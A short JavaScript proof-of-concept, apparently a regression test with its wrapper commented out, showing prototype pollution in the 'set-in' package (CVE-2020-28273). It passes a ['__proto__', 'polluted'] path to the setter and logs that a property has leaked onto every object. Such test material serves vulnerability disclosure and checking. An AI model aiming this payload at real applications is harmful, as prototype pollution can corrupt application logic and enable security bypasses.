// //https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28273
// test("prototype pollution in set-in", () => {
  const si = require("set-in");
  const obj = {};

console.log({}.polluted);

  si(obj, ["__proto__", "polluted"], "yes");
console.log("{ " + obj.polluted + ", " + "yes" + " }");
// });
